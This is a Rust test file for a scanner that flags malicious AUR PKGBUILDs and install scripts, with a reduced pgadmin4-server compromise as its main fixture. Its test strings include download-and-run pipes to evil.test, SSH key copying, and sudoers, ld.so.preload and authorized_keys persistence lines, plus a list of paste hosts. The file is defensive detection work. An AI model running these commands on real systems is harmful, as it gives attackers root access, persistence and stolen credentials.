//! Fixtures are inline string literals, never files on disk, and no
//! fixture is ever executed — the scanner only reads text. The one
//! "binary" is four magic bytes in a byte literal.

use super::*;

fn pkg(pkgbuild: &str) -> Package {
    Package {
        name: "testpkg".into(),
        upstream: parse_upstream_url(pkgbuild.as_bytes()),
        pkgbuild: pkgbuild.as_bytes().to_vec(),
        ..Default::default()
    }
}

fn rules(r: &ScanResult) -> Vec<&str> {
    r.findings.iter().map(|f| f.rule).collect()
}

// --- the pgadmin4-server compromise, b7de293 (2026-07-29) ---
//
// Reduced from the real commit. Three tells: a local file in source=(),
// a sudo call in build(), and 3 sources against 2 checksums.

const PGADMIN_MALICIOUS: &str = r#"
pkgname=pgadmin4-server
pkgver=9.14
url='https://www.pgadmin.org/'
source=("pgadmin4-${pkgver}.tar.gz::https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v${pkgver}/source/pgadmin4-${pkgver}.tar.gz"
  'parser'
  "server.patch")
sha256sums=('b8ebfa7afe41da6c2e46c12ae53e5cbbe3b3864cd91e8d5b0d79fdc51ff5c9d3'
  'd276423ab3eaa7abaf14e720c51f49cc18a528d2e1b6324d4d05257d5d58f556')

prepare() {
  cd "$srcdir/pgadmin4-${pkgver}"
  patch -p1 <"../server.patch"
}

build() {
  sudo "$srcdir/parser"
  cd "$srcdir/pgadmin4-${pkgver}"
  yarn install && yarn run bundle
}
"#;

/// The preceding clean revision, d0b7030. Identical but for the three
/// added lines — this is what makes the case a good regression test.
const PGADMIN_CLEAN: &str = r#"
pkgname=pgadmin4-server
pkgver=9.14
url='https://www.pgadmin.org/'
source=("pgadmin4-${pkgver}.tar.gz::https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v${pkgver}/source/pgadmin4-${pkgver}.tar.gz"
  "server.patch")
sha256sums=('b8ebfa7afe41da6c2e46c12ae53e5cbbe3b3864cd91e8d5b0d79fdc51ff5c9d3'
  'd276423ab3eaa7abaf14e720c51f49cc18a528d2e1b6324d4d05257d5d58f556')

prepare() {
  cd "$srcdir/pgadmin4-${pkgver}"
  patch -p1 <"../server.patch"
}

build() {
  cd "$srcdir/pgadmin4-${pkgver}"
  yarn install && yarn run bundle
}
"#;

fn pgadmin_malicious() -> Package {
    let mut p = pkg(PGADMIN_MALICIOUS);
    p.name = "pgadmin4-server".into();
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF\x02\x01\x01\x00".to_vec(),
        size: 43640,
        added: true,
    }];
    p
}

#[test]
fn pgadmin4_malicious_is_blocked() {
    let r = scan(&pgadmin_malicious());
    assert_eq!(r.verdict, Verdict::Block, "{:#?}", r.findings);
    let got = rules(&r);
    for want in [
        "privilege-escalation-in-build",
        "binary-in-source",
        "checksum-count-mismatch",
        "local-binary-added",
    ] {
        assert!(got.contains(&want), "missing {want}: {got:?}");
    }
}

#[test]
fn pgadmin4_clean_revision_is_not_blocked() {
    let r = scan(&pkg(PGADMIN_CLEAN));
    assert_ne!(r.verdict, Verdict::Block, "{:#?}", r.findings);
    // yarn is legitimate here, so the clean revision still warns. What
    // must NOT happen is the two revisions scoring the same — that is the
    // exact failure the Go scanner has.
    for absent in [
        "privilege-escalation-in-build",
        "binary-in-source",
        "checksum-count-mismatch",
        "local-binary-added",
    ] {
        assert!(!rules(&r).contains(&absent), "false positive: {absent}");
    }
}

#[test]
fn pgadmin4_revisions_are_distinguishable() {
    // The regression that motivated the content rules: `aegis aur scan`
    // produced byte-identical output for these two trees.
    let mal = scan(&pgadmin_malicious());
    let clean = scan(&pkg(PGADMIN_CLEAN));
    assert_ne!(mal.verdict, clean.verdict);
    assert!(mal.findings.len() > clean.findings.len());
}

// --- privilege-escalation-in-build ---

#[test]
fn sudo_in_build_blocks() {
    for line in [
        r#"  sudo "$srcdir/parser""#,
        "  doas /tmp/x",
        "  pkexec /tmp/x",
        "  cd /tmp && sudo ./x",
        "  true; sudo ./x",
    ] {
        let src = format!("build() {{\n{line}\n}}\n");
        let r = scan(&pkg(&src));
        assert_eq!(r.verdict, Verdict::Block, "should block: {line}");
    }
}

#[test]
fn sudo_lookalikes_do_not_fire() {
    for line in [
        "# sudo is not needed to build this",
        "  sudo_prompt=no",
        "  echo 'run sudo make install yourself'", // inside quotes, still prose
        "  _sudoers=/etc/sudoers.d",
    ] {
        let src = format!("build() {{\n{line}\n}}\n");
        let r = scan(&pkg(&src));
        assert!(
            !rules(&r).contains(&"privilege-escalation-in-build"),
            "false positive on: {line}"
        );
    }
}

// --- binary-in-source ---

#[test]
fn binary_in_source_detects_by_magic_not_extension() {
    // Named `parser` — no extension. An extension-based check cannot see
    // this, which is the whole point.
    let src = "source=('parser')\nsha256sums=('SKIP')\n";
    let mut p = pkg(src);
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF\x02".to_vec(),
        size: 100,
        added: false,
    }];
    assert!(rules(&scan(&p)).contains(&"binary-in-source"));
}

#[test]
fn binary_magic_variants() {
    for (head, kind) in [
        (b"\x7fELF".to_vec(), "ELF"),
        (b"MZ\x90\x00".to_vec(), "PE"),
        (vec![0xcf, 0xfa, 0xed, 0xfe], "Mach-O"),
    ] {
        let mut p = pkg("source=('blob')\nsha256sums=('SKIP')\n");
        p.local_files = vec![LocalFile {
            name: "blob".into(),
            head,
            size: 10,
            added: false,
        }];
        assert!(
            rules(&scan(&p)).contains(&"binary-in-source"),
            "missed {kind}"
        );
    }
}

#[test]
fn committed_shell_script_is_not_a_binary() {
    // Measured on 97 recently-updated AUR packages: every binary-in-source
    // hit was a two-line launcher wrapper committed next to the PKGBUILD.
    // That is standard practice, and blocking on it aborts real installs.
    let mut p = pkg("source=('launch.sh')\nsha256sums=('abc')\n");
    p.local_files = vec![LocalFile {
        name: "launch.sh".into(),
        head: b"#!/bin/sh".to_vec(),
        size: 67,
        added: true,
    }];
    let r = scan(&p);
    assert!(
        !rules(&r).contains(&"binary-in-source"),
        "{:#?}",
        r.findings
    );
    assert_ne!(r.verdict, Verdict::Block);
}

#[test]
fn text_local_source_is_clean() {
    // A .patch committed alongside the PKGBUILD is completely normal.
    let mut p = pkg("source=('server.patch')\nsha256sums=('abc')\n");
    p.local_files = vec![LocalFile {
        name: "server.patch".into(),
        head: b"--- a/x\n".to_vec(),
        size: 200,
        added: true,
    }];
    let r = scan(&p);
    let got = rules(&r);
    assert!(!got.contains(&"binary-in-source"), "{got:?}");
    assert!(!got.contains(&"local-binary-added"), "{got:?}");
}

#[test]
fn remote_source_is_not_treated_as_local() {
    let mut p = pkg("source=('https://example.com/parser')\nsha256sums=('abc')\n");
    p.local_files = vec![LocalFile {
        name: "parser".into(),
        head: b"\x7fELF".to_vec(),
        size: 10,
        added: false,
    }];
    assert!(!rules(&scan(&p)).contains(&"binary-in-source"));
}

// --- checksum-count-mismatch ---

#[test]
fn checksum_count_mismatch_fires() {
    let r = scan(&pkg("source=('a' 'b' 'c')\nsha256sums=('x' 'y')\n"));
    assert!(rules(&r).contains(&"checksum-count-mismatch"));
}

#[test]
fn matching_checksum_counts_are_clean() {
    let r = scan(&pkg("source=('a' 'b')\nsha256sums=('x' 'y')\n"));
    assert!(!rules(&r).contains(&"checksum-count-mismatch"));
}

#[test]
fn multiline_arrays_parse() {
    let src = "source=('a'\n  'b'\n  'c')\nsha256sums=('x'\n  'y'\n  'z')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"checksum-count-mismatch"));
}

#[test]
fn crlf_and_multibyte_before_array_does_not_panic() {
    // Regression: bash_array summed `lines()` lengths + 1, drifting one byte
    // per CRLF line; with a multibyte char before source=(), the drifted offset
    // sliced mid-char and panicked. CRLF endings + `é` in a comment, many short
    // lines to build up the drift, then a source array.
    let mut src = String::from("# pkgbuildé comment\r\n");
    for i in 0..12 {
        src.push_str(&format!("var{i}=x\r\n"));
    }
    src.push_str("source=('a'\r\n  'b')\r\n");
    // Must not panic; parse succeeds and finds the two entries (no mismatch).
    let r = scan(&pkg(&src));
    let _ = rules(&r);
}

// --- ported rules still behave ---

#[test]
fn download_exec_blocks() {
    let r = scan(&pkg("build() {\n  curl -sSL http://evil.test/p | sh\n}\n"));
    assert_eq!(r.verdict, Verdict::Block);
    assert!(rules(&r).contains(&"download-exec"));
}

#[test]
fn untrusted_host_warns() {
    let r = scan(&pkg(
        "url='https://example.com'\nsource=('https://pastebin.com/raw/x')\n",
    ));
    assert!(rules(&r).contains(&"source-untrusted-host"));
    assert_eq!(r.verdict, Verdict::Warn);
}

#[test]
fn bare_ip_source_warns() {
    let r = scan(&pkg("source=('http://192.0.2.1/x.tar.gz')\n"));
    assert!(rules(&r).contains(&"source-bare-ip"));
}

#[test]
fn ioc_package_blocks_regardless_of_content() {
    let mut p = pkg("pkgname=librewolf-fix-bin\n");
    p.name = "librewolf-fix-bin".into();
    let r = scan(&p);
    assert_eq!(r.verdict, Verdict::Block);
    assert!(rules(&r).contains(&"ioc-package"));
}

#[test]
fn credential_access_warns() {
    let r = scan(&pkg("build() {\n  cp ~/.ssh/id_rsa /tmp/x\n}\n"));
    assert!(rules(&r).contains(&"credential-access"));
}

#[test]
fn benign_pkgbuild_is_allowed() {
    let src = r#"
pkgname=hello
pkgver=1.0
url='https://github.com/example/hello'
source=("https://github.com/example/hello/archive/v${pkgver}.tar.gz")
sha256sums=('abc123')

build() {
  cd "hello-$pkgver"
  make
}
"#;
    let r = scan(&pkg(src));
    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
}

#[test]
fn parse_upstream_url_reads_the_url_field() {
    assert_eq!(
        parse_upstream_url(b"pkgname=x\nurl='https://example.com/p'\n"),
        "https://example.com/p"
    );
    assert_eq!(parse_upstream_url(b"pkgname=x\n"), "");
}

#[test]
fn empty_package_is_allowed() {
    let r = scan(&Package::default());
    assert_eq!(r.verdict, Verdict::Allow);
    assert!(r.findings.is_empty());
}

#[test]
fn evidence_truncation_is_char_safe() {
    // A long UTF-8 line must not panic on a byte-index slice.
    let long = "é".repeat(400);
    let src = format!("build() {{\n  sudo x # {long}\n}}\n");
    let r = scan(&pkg(&src));
    assert_eq!(r.verdict, Verdict::Block);
}

// --- git history integrity ---
//
// Thresholds calibrated against 35 real AUR clones; the values below are
// taken from that sample so a future tweak has to face the real data.

const NOW: i64 = 1_785_400_000; // 2026-07-30, fixed so tests never drift
const DAY: i64 = 86_400;

fn with_history(dates: Vec<i64>, roots: usize, first_submitted: Option<i64>) -> Package {
    let mut p = pkg("pkgname=x\n");
    p.history = Some(GitHistory {
        commit_dates: dates,
        root_count: roots,
    });
    p.first_submitted = first_submitted;
    p.now = Some(NOW);
    p
}

#[test]
fn nonmonotonic_commit_dates_flagged() {
    // git log order is newest-first, so this must be descending.
    let p = with_history(vec![NOW, NOW - 10 * DAY, NOW - 5 * DAY], 1, None);
    assert!(rules(&scan(&p)).contains(&"commit-date-nonmonotonic"));
}

#[test]
fn monotonic_history_is_clean() {
    let p = with_history(vec![NOW, NOW - 5 * DAY, NOW - 10 * DAY], 1, None);
    assert!(!rules(&scan(&p)).contains(&"commit-date-nonmonotonic"));
}

#[test]
fn spliced_history_flagged() {
    let p = with_history(vec![NOW, NOW - DAY], 2, None);
    assert!(rules(&scan(&p)).contains(&"multiple-root-commits"));
}

#[test]
fn recently_wiped_history_flagged() {
    // AUR says 2020; git only goes back 30 days.
    let p = with_history(vec![NOW, NOW - 30 * DAY], 1, Some(NOW - 2000 * DAY));
    let r = scan(&p);
    assert!(rules(&r).contains(&"history-recently-wiped"));
    assert_eq!(r.verdict, Verdict::Warn);
}

#[test]
fn aur4_migration_shape_is_not_flagged() {
    // The dominant false positive in the sample: 11 of 35 clones have a
    // history that starts years after FirstSubmitted because the 2015
    // AUR3→AUR4 migration reset it. Old oldest-commit ⇒ not a wipe.
    let p = with_history(
        vec![NOW, NOW - 4070 * DAY],
        1,
        Some(NOW - (4070 + 2035) * DAY),
    );
    assert!(!rules(&scan(&p)).contains(&"history-recently-wiped"));
}

#[test]
fn history_predating_first_submitted_is_not_flagged() {
    // Imported upstream history: oldest commit *precedes* FirstSubmitted.
    // Negative drift is benign, not a wipe.
    let p = with_history(vec![NOW, NOW - 2723 * DAY], 1, Some(NOW - 400 * DAY));
    assert!(!rules(&scan(&p)).contains(&"history-recently-wiped"));
}

#[test]
fn pgadmin4_history_was_not_tampered() {
    // The real attack passed every integrity check: the maintainer had
    // legitimate push access, so nothing about the history is wrong. This
    // documents the boundary — history rules and content rules cover
    // different threats.
    let mut p = pgadmin_malicious();
    p.history = Some(GitHistory {
        commit_dates: vec![NOW - DAY, NOW - 113 * DAY, NOW - 756 * DAY],
        root_count: 1,
    });
    p.first_submitted = Some(NOW - 755 * DAY);
    p.now = Some(NOW);
    let r = scan(&p);
    let got = rules(&r);
    for absent in [
        "commit-date-nonmonotonic",
        "multiple-root-commits",
        "history-recently-wiped",
    ] {
        assert!(!got.contains(&absent), "history rule fired: {absent}");
    }
    // Still blocked — by the content rules.
    assert_eq!(scan(&p).verdict, Verdict::Block);
}

#[test]
fn absent_history_is_silent() {
    let r = scan(&pkg("pkgname=x\n"));
    for rule in [
        "commit-date-nonmonotonic",
        "multiple-root-commits",
        "history-recently-wiped",
    ] {
        assert!(!rules(&r).contains(&rule));
    }
}

#[test]
fn wipe_needs_both_first_submitted_and_now() {
    // Missing either side must not guess.
    let p = with_history(vec![NOW, NOW - 30 * DAY], 1, None);
    assert!(!rules(&scan(&p)).contains(&"history-recently-wiped"));
    let mut p2 = with_history(vec![NOW, NOW - 30 * DAY], 1, Some(NOW - 2000 * DAY));
    p2.now = None;
    assert!(!rules(&scan(&p2)).contains(&"history-recently-wiped"));
}

// --- regressions found by scanning 97 recently-updated AUR packages ---

#[test]
fn githubusercontent_is_not_an_untrusted_host() {
    // The Go original matched the blocklist with a plain substring test, so
    // `t.co` matched raw.githubusercon(tent.co)m. Four of 97 sampled
    // packages were flagged for fetching an icon from GitHub.
    let src = "url='https://github.com/o/p'\n\
               source=('https://raw.githubusercontent.com/o/p/v1/icon.png')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"source-untrusted-host"));
}

#[test]
fn real_paste_hosts_still_match() {
    for host in [
        "https://pastebin.com/raw/x",
        "https://gist.github.com/a/b",
        "https://t.co/abcd",
        "https://transfer.sh/x/y",
        "https://files.anonfiles.com/x",
    ] {
        let src = format!("url='https://example.com'\nsource=('{host}')\n");
        assert!(
            rules(&scan(&pkg(&src))).contains(&"source-untrusted-host"),
            "missed {host}"
        );
    }
}

#[test]
fn homepage_url_does_not_cause_host_drift() {
    // url= is the project homepage, source= is a GitHub release. This is how
    // most packages are written; 22 of 97 tripped the old rule.
    let src = "url='https://chan.app'\n\
               source=('https://github.com/fiorix/chan/archive/v0.82.0.tar.gz')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"source-host-drift"));
}

#[test]
fn drift_between_two_code_hosts_still_flagged() {
    // The Chaos RAT shape: upstream says one repo, source pulls another.
    let src = "url='https://github.com/alice/proj'\n\
               source=('https://gitlab.com/bob/proj/-/archive/v1.tar.gz')\n";
    assert!(rules(&scan(&pkg(src))).contains(&"source-host-drift"));
}

#[test]
fn urls_in_comments_are_ignored() {
    let src = "url='https://example.com'\n\
               # see https://pastebin.com/raw/x for background\n\
               source=('https://example.com/a.tar.gz')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"source-untrusted-host"));
}

#[test]
fn brace_expansion_is_not_a_checksum_mismatch() {
    // makepkg expands `.tar.{xz,sign}` into two sources; we do not, so we
    // must stay silent rather than report a mismatch that is not real.
    let src = "source=(https://cdn.kernel.org/l.tar.{xz,sign}\n  config)\n\
               sha256sums=('a' 'b' 'c')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"checksum-count-mismatch"));
}

#[test]
fn comments_inside_arrays_are_stripped() {
    let src = "source=('a'\n  config  # the main kernel config file\n)\n\
               sha256sums=('x' 'y')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"checksum-count-mismatch"));
}

#[test]
fn dependency_names_are_not_credential_access() {
    // A dep literally called qtkeychain-qt6, on a continuation line of a
    // multi-line depends=() array.
    let src = "depends=(\n  qt6-base\n  qtkeychain-qt6\n)\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"credential-access"));
}

#[test]
fn optdepends_prose_is_not_credential_access() {
    let src = "optdepends=('openssh: ssh-agent support and ~/.ssh/config import')\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"credential-access"));
}

#[test]
fn real_credential_access_in_build_still_flagged() {
    let src = "build() {\n  cat ~/.ssh/id_rsa > /tmp/x\n}\n";
    assert!(rules(&scan(&pkg(src))).contains(&"credential-access"));
}

#[test]
fn split_package_eval_is_not_obfuscation() {
    let src = "eval \"package_$_p() {\n  _package\n}\"\n";
    assert!(!rules(&scan(&pkg(src))).contains(&"eval-obfuscation"));
}

#[test]
fn small_commit_date_inversions_are_tolerated() {
    // Rebases and clock skew leave author dates minutes out of order; two
    // of 97 sampled packages invert by 168s and 974s.
    let p = with_history(vec![NOW, NOW - 10 * DAY + 900, NOW - 10 * DAY], 1, None);
    assert!(!rules(&scan(&p)).contains(&"commit-date-nonmonotonic"));
}

#[test]
fn large_commit_date_inversions_still_flagged() {
    let p = with_history(vec![NOW, NOW - 30 * DAY, NOW - 10 * DAY], 1, None);
    assert!(rules(&scan(&p)).contains(&"commit-date-nonmonotonic"));
}

// --- .install root-context rules ---

fn with_install(body: &str) -> Package {
    let mut p = pkg("pkgname=x\nurl='https://example.com'\n");
    p.install = body.as_bytes().to_vec();
    p
}

#[test]
fn su_in_install_hook_is_de_escalation_not_escalation() {
    // Real line from profile-sync-daemon's .INSTALL. pacman already runs
    // this as root, so `su <user>` is dropping privileges.
    let src = r#"post_install() {
  su "$1" -s /bin/sh -c 'XDG_RUNTIME_DIR=/run/user/$UID systemctl --user daemon-reload'
}"#;
    let r = scan(&with_install(src));
    assert!(
        !rules(&r).contains(&"privilege-escalation-in-build"),
        "{:#?}",
        r.findings
    );
}

#[test]
fn sudo_in_pkgbuild_still_blocks() {
    // The carve-out above must not weaken the PKGBUILD case.
    let r = scan(&pkg("build() {\n  sudo ./x\n}\n"));
    assert_eq!(r.verdict, Verdict::Block);
}

#[test]
fn install_hook_network_blocks() {
    for line in [
        "  curl -o /tmp/x https://evil.test/p",
        "  wget https://evil.test/p",
        "  git clone https://evil.test/r /opt/x",
    ] {
        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
        assert_eq!(r.verdict, Verdict::Block, "should block: {line}");
        assert!(rules(&r).contains(&"install-hook-network"));
    }
}

#[test]
fn install_hook_persistence_and_privilege() {
    let cases = [
        (
            "  echo x >> /etc/profile.d/z.sh",
            "install-hook-persistence",
        ),
        (
            "  cat k >> /root/.ssh/authorized_keys",
            "install-hook-authorized-keys",
        ),
        (
            "  echo 'u ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/u",
            "install-hook-sudoers",
        ),
        (
            "  echo /tmp/e.so > /etc/ld.so.preload",
            "install-hook-ld-preload",
        ),
        ("  chmod u+s /usr/bin/x", "install-hook-setuid"),
        (
            "  usermod -aG wheel eviluser",
            "install-hook-privileged-group",
        ),
        (
            "  install -Dm755 /tmp/h /usr/local/bin/.cache",
            "install-hook-drops-executable",
        ),
    ];
    for (line, want) in cases {
        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
        assert!(rules(&r).contains(&want), "missed {want} on: {line}");
    }
}

#[test]
fn install_hook_rules_do_not_apply_to_pkgbuild() {
    // `install -Dm755` in package() is how every package works.
    let r = scan(&pkg(
        "package() {\n  install -Dm755 x \"$pkgdir/usr/bin/x\"\n}\n",
    ));
    assert!(!rules(&r).contains(&"install-hook-drops-executable"));
    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
}

#[test]
fn install_d_creates_a_directory_and_is_clean() {
    // Real line from polkit's .INSTALL — the last false positive across the
    // 41 sampled scripts. Lowercase -d makes a directory; 755 on a
    // directory is normal.
    let src =
        "post_install() {\n  install -d -o root -g root -m 755 usr/share/polkit-1/rules.d\n}\n";
    let r = scan(&with_install(src));
    assert!(
        !rules(&r).contains(&"install-hook-drops-executable"),
        "{:#?}",
        r.findings
    );
}

#[test]
fn ordinary_install_hook_is_clean() {
    // The shape real .INSTALL scripts have.
    let src = r#"post_install() {
  systemctl --global enable pipewire.socket
  update-desktop-database -q
  ldconfig
}
post_upgrade() {
  post_install
}"#;
    let r = scan(&with_install(src));
    assert_eq!(r.verdict, Verdict::Allow, "{:#?}", r.findings);
}

#[test]
fn echoed_instructions_are_not_actions() {
    // Real lines from a 116-package AUR sample: post-install scripts telling
    // the user what to run. Printing is not doing.
    for line in [
        r#"  echo "systemctl enable derper.service --now""#,
        r#"  echo "   sudo systemctl enable --now grdcontrol""#,
        r#"  printf 'enable it with: systemctl enable foo.service\n'"#,
    ] {
        let r = scan(&with_install(&format!("post_install() {{\n{line}\n}}\n")));
        assert!(
            r.findings.is_empty(),
            "false positive on echoed text: {line} -> {:#?}",
            r.findings
        );
    }
}

#[test]
fn echoed_text_containing_a_pipe_is_still_flagged() {
    // Known limitation, deliberately on the safe side: telling a pipe
    // character inside a quoted string from a real pipe needs shell
    // parsing. `echo "run: curl x | sh"` is therefore treated as an action
    // and reported. That is a false positive, not a miss.
    let src = "post_install() {\n  echo 'run: curl https://x.test/p | sh'\n}\n";
    assert!(!scan(&with_install(src)).findings.is_empty());
}

#[test]
fn echo_with_redirect_is_an_action() {
    // Printing into a file is writing a file.
    let src = "post_install() {\n  echo 'evil' > /etc/profile.d/z.sh\n}\n";
    assert!(rules(&scan(&with_install(src))).contains(&"install-hook-persistence"));
}

#[test]
fn echo_piped_to_shell_is_an_action() {
    let src = "post_install() {\n  echo 'curl https://evil.test/p' | sh\n}\n";
    let r = scan(&with_install(src));
    assert!(!r.findings.is_empty(), "piped echo must not be skipped");
}
